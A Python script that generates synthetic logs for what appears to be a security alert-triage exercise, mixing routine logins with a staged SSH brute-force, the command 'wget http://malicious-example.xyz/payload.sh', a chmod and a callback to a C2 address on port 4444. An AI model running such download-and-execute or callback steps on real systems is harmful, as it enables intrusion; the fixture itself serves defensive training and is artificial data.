import json, random
from datetime import datetime, timedelta

random.seed(42)
start = datetime(2026, 10, 1, 8, 0, 0)
logs = []

def add(ts, host, user, src, dst, event, process="", raw=""):
    logs.append({
        "timestamp": ts.strftime("%Y-%m-%d %H:%M:%S"),
        "host": host, "user": user, "src_ip": src, "dst_ip": dst,
        "event_type": event, "process": process, "raw": raw,
    })

# --- Normal background activity (noise) ---
users = ["alice", "bob", "carol", "dave"]
internal = ["10.0.0.5", "10.0.0.6", "10.0.0.7", "10.0.0.8"]
for _ in range(300):
    ts = start + timedelta(minutes=random.randint(0, 900))
    u, ip = random.choice(users), random.choice(internal)
    add(ts, "web-01", u, ip, "10.0.0.20", "login_success",
        raw=f"Accepted password for {u} from {ip}")

# --- ATTACK 1: SSH brute force -> success -> malware download -> C2 ---
attacker = "185.220.101.45"   # replace later with a real bad IP from AbuseIPDB/Feodo
c2 = "162.243.103.246"
t0 = start + timedelta(hours=10, minutes=10)
for i in range(47):
    add(t0 + timedelta(seconds=i * 7), "web-01", "admin", attacker, "10.0.0.20",
        "login_failed", raw=f"Failed password for admin from {attacker}")
t1 = t0 + timedelta(minutes=6)
add(t1, "web-01", "admin", attacker, "10.0.0.20", "login_success",
    raw=f"Accepted password for admin from {attacker}")
add(t1 + timedelta(minutes=1), "web-01", "admin", "10.0.0.20", "-", "process_exec",
    process="wget", raw="wget http://malicious-example.xyz/payload.sh")
add(t1 + timedelta(minutes=2), "web-01", "admin", "10.0.0.20", "-", "process_exec",
    process="chmod", raw="chmod +x payload.sh")
add(t1 + timedelta(minutes=3), "web-01", "admin", "10.0.0.20", c2, "network_connection",
    process="payload.sh", raw=f"outbound connection to {c2}:4444")

logs.sort(key=lambda x: x["timestamp"])
json.dump(logs, open("data/sample_logs/logs.json", "w"), indent=2)

alert = {
    "alert_id": "ALERT-001",
    "timestamp": t1.strftime("%Y-%m-%d %H:%M:%S"),
    "rule_name": "Multiple failed SSH logins followed by success",
    "host": "web-01",
    "description": f"47 failed logins for user admin from {attacker} then a successful login.",
    "severity_hint": "high",
}
json.dump(alert, open("data/sample_alerts/alert_001.json", "w"), indent=2)
print(len(logs), "logs created")
